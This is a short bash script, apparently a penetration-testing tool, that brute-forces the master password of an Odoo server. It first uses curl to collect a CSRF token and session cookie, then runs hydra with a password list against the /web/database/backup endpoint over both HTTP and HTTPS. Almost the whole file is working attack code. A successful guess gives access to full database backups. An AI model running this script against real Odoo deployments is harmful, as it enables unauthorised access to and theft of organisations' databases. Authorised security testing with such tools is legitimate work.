#/bin/bash

# Variables
host="192.168.0.2"
port="8069"
url="http://$host:$port/web"
db_name="initdb"
passwd_list="pw_list.txt"

# Get CSRF token and session_id
# - The -L is needed to follow the redirection to login page after the database has been selected
# - The cookie is parsed to get session_id
token=$(curl -sLc /tmp/odoo.cookie "${url}"?db="$db_name" | grep 'name="csrf_token"' | sed -e 's/^[ \t]*//' | cut -d '"' -f6)
session_id=$(grep session_id /tmp/odoo.cookie | awk '{print $7}')

# HTTP Odoo admin (no username required)
hydra -vV -f -I -s "${port}" -l '' -P "${passwd_list}" "${host}" http-post-form \
"/web/database/backup:master_pwd=^PASS^&name=initdb&backup_format=zip:F=denied:H=Cookie: session_id=${session_id}"

exit

# HTTPS Odoo admin (no username required)
hydra -vV -f -I -S -s "${port}" -l '' -P "${passwd_list}" "${host}" https-post-form \
"/web/database/backup:master_pwd=^PASS^&name=initdb&backup_format=zip:F=denied:H=Cookie: session_id=${session_id}"
